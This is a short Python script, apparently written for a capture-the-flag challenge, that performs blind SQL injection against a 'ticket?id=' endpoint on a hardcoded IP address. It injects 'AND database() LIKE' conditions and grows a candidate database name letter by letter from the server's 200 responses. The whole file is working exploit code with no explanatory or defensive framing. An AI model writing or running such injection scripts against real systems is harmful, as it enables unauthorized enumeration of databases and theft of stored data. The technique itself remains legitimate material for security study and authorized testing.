import requests
from string import ascii_lowercase

name_list = []


def find_name(name_list, n):
    print(name_list)
    if n > 6:
        return name_list
    else:
        n = n + 1
        temp_list = []
        if len(name_list) > 0:
            for name in name_list:
                for c in ascii_lowercase:
                    temp_name = name + c
                    res = requests.get("http://35.190.155.168/d8d5c262ef/ticket?id=3+AND+database()+LIKE+'%" + temp_name + "%'")
                    if res.status_code == 200:
                        temp_list.append(temp_name)
        else:
            for c in ascii_lowercase:
                res = requests.get("http://35.190.155.168/d8d5c262ef/ticket?id=3+AND+database()+LIKE+'%" + c + "'")
                if res.status_code == 200:
                    temp_list.append(c)
                    print(res.content)

        return find_name(temp_list, n)


print(find_name(name_list, 1))
